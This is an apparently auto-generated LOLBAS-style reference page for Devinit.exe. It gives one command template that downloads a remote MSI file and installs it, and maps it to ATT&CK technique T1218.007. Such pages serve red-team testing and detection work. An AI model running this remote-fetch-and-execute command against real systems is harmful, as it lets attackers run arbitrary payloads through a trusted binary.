---
parsed_by: focuslocust
source: commands
type: generated
---
# Devinit Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Devinit.exe

Tool page: [Devinit.exe](../../tools/windows/devinit.exe.md)

### Executes code from a (remote) MSI file.

```text
devinit.exe run -t msi-install -i {REMOTEURL:.msi}
```

Description:

Downloads an MSI file to C:\Windows\Installer and then installs it.

Related ATT&CK:

- [T1218.007](../../attack/techniques/T1218.007-msiexec.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Devinit.yml` |
| Evidence | Command preserved from source parser. |
